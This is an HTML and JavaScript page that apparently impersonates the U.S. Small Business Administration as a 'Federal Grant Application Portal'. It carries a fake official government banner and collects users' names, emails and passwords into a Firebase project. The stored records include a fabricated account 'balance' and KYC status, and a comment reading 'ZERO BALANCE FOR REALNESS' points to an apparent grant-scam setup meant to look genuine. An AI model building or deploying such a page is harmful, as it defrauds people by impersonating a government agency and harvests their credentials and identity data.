<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | Create 2026 Account</title>
    <style>
        :root { --sba-blue: #00274c; --sba-accent: #1e3a8a; }
        body { background: #f1f5f9; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        
        .gov-banner { background: #f1f1f1; color: #333; font-size: 10px; padding: 6px 15px; display: flex; align-items: center; font-weight: 700; border-bottom: 1px solid #ddd; }
        .nav-header { background: var(--sba-blue); padding: 15px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        
        .container { max-width: 400px; margin: 20px auto; padding: 0 15px; }
        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border-top: 5px solid var(--sba-accent); }
        
        label { display: block; font-size: 11px; font-weight: 900; color: var(--sba-blue); margin: 15px 0 6px; text-transform: uppercase; letter-spacing: 0.5px; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #cbd5e1; font-size: 14px; outline: none; box-sizing: border-box; }
        input:focus { border-color: var(--sba-accent); }

        /* LEGAL SECTION */
        .cert-box { display: flex; gap: 10px; background: #f8fafc; padding: 15px; border-radius: 8px; margin: 20px 0; border: 1px solid #e2e8f0; }
        .cert-box input { width: 20px; height: 20px; margin: 0; cursor: pointer; }
        .cert-box label { text-transform: none; font-weight: 500; color: #475569; font-size: 10px; line-height: 1.4; margin: 0; letter-spacing: 0; cursor: pointer; }

        .reg-btn { background: var(--sba-accent); color: white; padding: 16px; border-radius: 8px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .reg-btn:disabled { background: #94a3b8; }
    </style>
</head>
<body>

    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:14px; margin-right:8px;">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE REGISTRATION
    </div>

    <div class="nav-header">
        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px; font-weight: 900;">SBA.GOV</h1>
    </div>

    <div class="container">
        <div class="card">
            <h2 style="font-size: 22px; color: var(--sba-blue); margin: 0 0 10px;">Create Profile</h2>
            <p style="font-size: 12px; color: #64748b; margin-bottom: 20px;">Federal Grant Application Portal - FY2026</p>
            
            <label>Full Legal Name</label>
            <input type="text" id="name" placeholder="First M. Last">

            <label>Email Address</label>
            <input type="email" id="email" placeholder="name@domain.com">

            <label>Secure Password</label>
            <input type="password" id="pass" placeholder="Min. 6 characters">

            <div class="cert-box">
                <input type="checkbox" id="terms">
                <label for="terms">
                    I certify that all provided information is accurate. I understand that misrepresentation to the SBA is a federal offense under <b>18 U.S.C. ยง 1001</b>. I have read and agree to the <a href="terms.html" style="color:var(--sba-accent); font-weight:bold; text-decoration:none;">Terms of Service</a>.
                </label>
            </div>

            <button id="regBtn" class="reg-btn">Start Application</button>
            
            <div style="text-align:center; margin-top:20px; font-size: 13px; color: #64748b;">
                Existing user? <a href="index.html" style="color: var(--sba-accent); font-weight: 700; text-decoration: none;">Sign In</a>
            </div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, createUserWithEmailAndPassword, sendEmailVerification } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        document.getElementById('regBtn').onclick = async () => {
            const name = document.getElementById('name').value.trim();
            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('pass').value;
            const agree = document.getElementById('terms').checked;

            if(!name || !email || !pass) return alert("NOTICE: Complete all fields for federal verification.");
            if(!agree) return alert("NOTICE: You must certify the accuracy of your information to proceed.");

            const btn = document.getElementById('regBtn');
            btn.innerText = "ENCRYPTING DATA...";
            btn.disabled = true;

            try {
                const res = await createUserWithEmailAndPassword(auth, email, pass);
                await sendEmailVerification(res.user);

                // ZERO BALANCE FOR REALNESS
                await setDoc(doc(db, "users", res.user.uid), {
                    fullName: name,
                    email: email,
                    balance: 0,
                    status: "PENDING VERIFICATION",
                    kycStatus: "NOT STARTED",
                    regDate: serverTimestamp()
                });

                alert("PROFILE SECURED.\n\nPlease check your email for verification. Your application portal is active.");
                window.location.href = 'dashboard.html';

            } catch(err) { 
                let errorMsg = "Please try again later.";
                if (err.code === 'auth/email-already-in-use') errorMsg = "Email already exists.";
                alert("REGISTRATION ERROR: " + errorMsg); 
                btn.disabled = false; 
                btn.innerText = "Start Application";
            }
        };
    </script>
</body>
</html>
